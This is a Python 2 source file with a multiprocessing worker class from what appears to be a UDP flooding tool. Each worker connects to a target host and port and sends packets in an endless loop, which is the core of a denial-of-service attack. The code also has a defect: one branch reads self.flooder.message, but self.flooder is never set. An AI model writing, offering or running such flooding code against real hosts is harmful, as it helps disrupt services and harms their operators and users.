import socket, time
from Functions import *
from multiprocessing import Process

class UDPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        self.host = flooder.host
        self.port = flooder.port
        self.wait = flooder.wait
        self.running = True
        self.byteCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

    def stop(self):
        self.running = False

    def run(self):
        try:
            try:
	            self.socket.connect((self.host, self.port))
	            print "thread", self.id, "connected"
            except Exception as e:
	            print "Couldn't connect:", e.args, self.host, self.port
	            return

            while self.running:
                try:
                    bytes = self.socket.send(self.message)
                    self.byteCount += bytes
                    if self.wait:
                        time.sleep(1)
                except Exception as e:
                    print "Couldn't send message on thread", self.id, "because", e.args
                    time.sleep(0.1)
                    pass
        except KeyboardInterrupt:
            return
